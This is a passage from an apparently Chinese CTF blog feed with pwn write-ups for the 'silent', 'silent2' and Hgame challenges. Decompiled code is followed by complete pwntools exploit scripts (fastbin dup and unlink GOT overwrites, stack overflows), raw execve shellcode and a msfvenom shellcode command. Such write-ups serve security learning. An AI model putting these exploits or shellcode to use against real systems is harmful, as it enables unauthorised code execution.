class="line">&#125;</span><br></pre></td></tr></table></figure><p>在add中可以控制malloc的大小。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">free_</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="built_in">free</span>(s[v1]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>free之后没有清空指针，可以进行fastbin dup修改got，在0x601ffa处发现满足size条件，要求fastbin大小为0x60，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">remote_addr = <span class="string">'39.107.32.132'</span></span><br><span class="line">remote_port = <span class="number">10000</span></span><br><span class="line">p = remote(remote_addr,remote_port)</span><br><span class="line">elf = ELF(<span class="string">'./'</span>+target)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(id)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(str(id))</span><br><span class="line"></span><br><span class="line">add(<span class="number">80</span>,<span class="string">'a'</span>*<span class="number">79</span>)</span><br><span class="line">add(<span class="number">80</span>,<span class="string">'b'</span>*<span class="number">79</span>)</span><br><span class="line">add(<span class="number">80</span>,<span class="string">'/bin/sh\x00'</span>.ljust(<span class="number">79</span>,<span class="string">'\x01'</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#a</span></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment">#b-&gt;a</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#a-&gt;b-&gt;a</span></span><br><span class="line"></span><br><span class="line">fake_addr = <span class="number">0x601ffa</span></span><br><span class="line">free_got = <span class="number">0x602018</span></span><br><span class="line">payload = p64(fake_addr).ljust(<span class="number">79</span>,<span class="string">'\x01'</span>)</span><br><span class="line">add(<span class="number">80</span>,payload) <span class="comment">#a</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">80</span>,<span class="string">'d'</span>*<span class="number">79</span>) <span class="comment">#b</span></span><br><span class="line">add(<span class="number">80</span>,<span class="string">'e'</span>*<span class="number">79</span>) <span class="comment">#a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'$0'</span>+<span class="string">'\x00'</span>*<span class="number">12</span>+p64(elf.plt[<span class="string">'system'</span>])</span><br><span class="line">add(<span class="number">80</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>) <span class="comment">#delete(6)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>方法二：这里要用到edit的功能<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">edit_</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(s[v1]);</span><br><span class="line">  read_(s[v1], v2 + <span class="number">1</span>);</span><br><span class="line">  read_(&amp;unk_602120, <span class="number">48L</span>L);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>思路是：通过edit修改fastbin中的fd，然后修改ID=0的地址，进行任意地址写。</p><p>脚本如下：(不加sleep，不保证每次都成功)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(id,content,content2)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.sendline(str(id))</span><br><span class="line">p.send(content)</span><br><span class="line">p.send(content2)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">0x5f</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">0x5f</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment">#a</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#b-&gt;a</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x60209d</span>),<span class="string">'\n'</span>) <span class="comment">#修改a的fd</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'c'</span>*<span class="number">0x5f</span>) <span class="comment">#a</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(<span class="number">0x602018</span>)) <span class="comment">#修改ID=0的地址为free@got</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x400730</span>),<span class="string">'\n'</span>) <span class="comment">#改成system@plt</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="silent2"><a href="#silent2" class="headerlink" title="silent2"></a>silent2</h3><p>大体跟1差不多，不过这里add限制了大小，只能0x10或大于0x80，那么可以利用unsorted bins进行unlink<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">add_</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">0x10</span> &amp;&amp; size &lt;= <span class="number">0x7F</span> ) <span class="comment">//这里改了</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>思路是：先申请两个0x100大小的chunk，然后free掉，再申请一个0x210的chunk，就会利旧刚刚free出来那两个chunk的空间，使用edit构造两个fake chunk(fake chunk1是free chunk，fake chunk2是allocated chunk)</p><p>再次delete(4)的时候，会触发unlink，最终结果是<code>p_addr</code>位置的地址就会改写是<code>&amp;p_addr-0x18</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(id)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(str(id))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(id,content,content2)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.sendline(str(id))</span><br><span class="line">p.send(content)</span><br><span class="line">p.send(content2)</span><br><span class="line"></span><br><span class="line">list_addr = <span class="number">0x6020C0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'AAAA'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'BBBB'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'CCCC'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'DDDD'</span>) <span class="comment">#3 &lt;-</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'EEEE'</span>) <span class="comment">#4</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(list_addr+<span class="number">0x18</span><span class="number">-0x18</span>)+p64(list_addr+<span class="number">0x18</span><span class="number">-0x10</span>)+<span class="string">'A'</span>*(<span class="number">0x100</span><span class="number">-0x20</span>)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x210</span><span class="number">-0x100</span>) <span class="comment"># fake chunk</span></span><br><span class="line">add(<span class="number">0x210</span>, payload) <span class="comment">#5 == 3+4</span></span><br><span class="line">delete(<span class="number">4</span>)  <span class="comment"># double free</span></span><br><span class="line">edit(<span class="number">3</span>,p64(elf.got[<span class="string">'free'</span>]),<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(elf.plt[<span class="string">'system'</span>]),<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'/bin/sh\x00'</span>) <span class="comment">#6</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;好菜，只做了一题，慢慢补~&lt;/p&gt;
&lt;h3 id=&quot;silent&quot;&gt;&lt;a href=&quot;#silent&quot; class=&quot;headerlink&quot; title=&quot;silent&quot;&gt;&lt;/a&gt;silent&lt;/h3&gt;&lt;p&gt;程序有3个功能，分别是add，delete和edit&lt;/p&gt;
&lt;f
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://4f-kira.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Hgame pwn</title>
    <link href="https://4f-kira.github.io/2018/02/07/Hgame-pwn/"/>
    <id>https://4f-kira.github.io/2018/02/07/Hgame-pwn/</id>
    <published>2018-02-07T05:07:14.000Z</published>
    <updated>2018-03-19T01:26:43.993Z</updated>
    
    <content type="html"><![CDATA[<p>终于补完了Hgame的pwn，学到很多新姿势。</p><h3 id="guess-number"><a href="#guess-number" class="headerlink" title="guess_number"></a>guess_number</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"enter your guess:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, &amp;nptr);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(&amp;nptr) == a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"OHHHHHHH! u did it !\norz orz orz orz\nhere is your flag:"</span>);</span><br><span class="line">    system(<span class="string">"cat flag"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>虽然开了canary，但是只要输入的东西覆盖到随机数，判断一样就cat flag了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ distance  0xffffd39c 0xffffd4b0</span><br><span class="line">From 0xffffd39c to 0xffffd4b0: 276 bytes, 69 dwords</span><br></pre></td></tr></table></figure></p><p>计算一下输入位置和随机数的距离，输入一堆’1’，<code>atoi</code>会将输入转成0x7fffffff。那么payload：<code>python -c &quot;from pwn import *;print &#39;1&#39;*276+p32(0x7fffffff)&quot; |nc 111.230.149.72 10002</code></p><h3 id="flag-server"><a href="#flag-server" class="headerlink" title="flag_server"></a>flag_server</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"your username length: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">while</span> ( v5 &gt; <span class="number">63</span> || !v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"sorry,your username is too LOOOOOOOOONG~~\nplease input again.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"your username length: "</span>);</span><br><span class="line">    <span class="keyword">while</span> ( getchar() != <span class="number">10</span> )</span><br><span class="line">      ;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"whats your username?"</span>);</span><br><span class="line">  read_n(&amp;s1, v5);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">"admin"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = time(<span class="number">0</span>);</span><br><span class="line">    srand(v3);</span><br><span class="line">    v8 = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello admin, please input the key: "</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%u"</span>, &amp;v6);</span><br><span class="line">    <span class="keyword">if</span> ( v6 != v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"noooo, you are not the TRUE admin!!!\nwho are you???"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v10 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hello %s, here is what I want to tell you:"</span>, &amp;s1);</span><br><span class="line">  <span class="keyword">if</span> ( v10 )</span><br><span class="line">    system(<span class="string">"cat flag"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_8048BF4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>虽然限制了username长度，可以输入负数直接绕过，然后输入一大堆’1’，将v10覆盖了就OK。</p><h3 id="zazahui"><a href="#zazahui" class="headerlink" title="zazahui"></a>zazahui</h3><p>神经病题目~<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v0 = fopen(<span class="string">"ad"</span>, <span class="string">"r"</span>);</span><br><span class="line">v1 = fopen(<span class="string">"flag"</span>, <span class="string">"r"</span>);</span><br><span class="line">__isoc99_fscanf(v0, <span class="string">"%s"</span>, &amp;ad);</span><br><span class="line"><span class="keyword">return</span> __isoc99_fscanf(v1, <span class="string">"%s"</span>, &amp;flag);</span><br></pre></td></tr></table></figure></p><p>广告词和flag都读到bss段了<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">s = (<span class="keyword">char</span> *)&amp;ad;</span><br><span class="line">v3 = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;::s);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;format, v3);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  getinput((<span class="keyword">int</span>)&amp;s1, <span class="number">188</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">"fuck it"</span>) )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, s) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"me too! again!!!\n"</span>);</span><br><span class="line">    --v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"that's not right :(\n"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>只要将s覆盖成flag的地址就可以，不用计算距离，直接干！payload：<code>python -c &quot;from pwn import *;print 100*p32(0x0804A060)&quot; |nc 111.230.149.72 10003</code></p><h3 id="zazahui-ver2"><a href="#zazahui-ver2" class="headerlink" title="zazahui_ver2"></a>zazahui_ver2</h3><p>打印广告词的代码移到while外了，不会每轮都打印广告，思路是照样覆盖s为flag地址，在strcmp那里做爆破，由于flag是0x00结尾，我们可以输入0x00，然后flag地址不停+1，直到提示right爆破出长度，然后再从后往前逐位爆破。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./zazahui_ver2'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">flaglen = <span class="number">0</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">  payload = <span class="number">176</span> * <span class="string">'\x00'</span></span><br><span class="line">  payload += p32(<span class="number">0x804a060</span> + i)</span><br><span class="line">  p.send(payload)</span><br><span class="line">  res = p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">'again'</span> <span class="keyword">in</span> res:</span><br><span class="line">    flaglen = i</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'flaglen: '</span>, flaglen</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(flaglen):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    payload = chr(j) + flag</span><br><span class="line">    payload = payload.ljust(<span class="number">176</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    payload += p32(<span class="number">0x804a060</span> + flaglen - i <span class="number">-1</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    res = p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'again'</span> <span class="keyword">in</span> res:</span><br><span class="line">      flag = chr(j) + flag</span><br><span class="line">      <span class="keyword">print</span> <span class="string">'flag:'</span>,flag</span><br><span class="line">      <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="ez-shellcode"><a href="#ez-shellcode" class="headerlink" title="ez_shellcode"></a>ez_shellcode</h3><p>超简单的shellcode，直接干就行了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'111.230.149.72'</span>,<span class="number">10004</span>)</span><br><span class="line">payload = <span class="string">"\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80"</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="ez-shellcode-ver2"><a href="#ez-shellcode-ver2" class="headerlink" title="ez_shellcode_ver2"></a>ez_shellcode_ver2</h3><p>一样是写shellcode，但是只能是大写字母和数字，可以用msfvenom生成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/exec CMD=/bin/sh -e x86/alpha_upper BufferRegister=EAX -f python</span><br><span class="line">shellcode =  &quot;PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIBJDKF8MI1BE62HVMSSMYM7E8VOSCCX302HFO2BU92NK9M3QBZHUXEPUPS0VOE2SY2NFO2S58C00WPSK9KQ8MMPAA&quot;</span><br></pre></td></tr></table></figure></p><h3 id="bash-jail"><a href="#bash-jail" class="headerlink" title="bash_jail"></a>bash_jail</h3><p>hint:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1.目录结构:</span><br><span class="line">/# ls -l</span><br><span class="line">total 32</span><br><span class="line">-rwxr-x--- 1 root ctf 6352 Feb 13 04:26 bash_jail</span><br><span class="line">drwxr-xr-x 2 root root 4096 Feb 13 04:28 bin</span><br><span class="line">drwxr-xr-x 2 root root 4096 Feb 13 04:28 dev</span><br><span class="line">-rwxr----- 1 root ctf 38 Feb 13 04:26 flag</span><br><span class="line">drwxr-xr-x 27 root root 4096 Feb 13 04:27 lib</span><br><span class="line">drwxr-xr-x 3 root root 4096 Feb 13 04:27 lib32</span><br><span class="line">drwxr-xr-x 2 root root 4096 Feb 13 04:27 lib64</span><br><span class="line"></span><br><span class="line">/bin# ls -l</span><br><span class="line">total 340</span><br><span class="line">-rwxr-xr-x 1 root root 52080 Feb 13 04:28 cat</span><br><span class="line">-rwxr-xr-x 1 root root 126584 Feb 13 04:28 ls</span><br><span class="line">-rwxr-xr-x 1 root root 154072 Feb 13 04:28 sh</span><br><span class="line"></span><br><span class="line">2.考虑下system源码?</span><br><span class="line">https://code.woboq.org/userspace/glibc/sysdeps/posix/system.c.html#do_system</span><br><span class="line"></span><br><span class="line">3.学习一下shell的变量,正则等等?</span><br><span class="line">https://linux.die.net/man/1/bash</span><br><span class="line"></span><br><span class="line">4.如果正赛出这种题,大概是这样的:https://www.youtube.com/watch?v=6D1LnMj0Yt0</span><br></pre></td></tr></table></figure></p><p>伪代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> *v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">char</span> *lineptr; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">size_t</span> n; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="number">0L</span>L;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  lineptr = <span 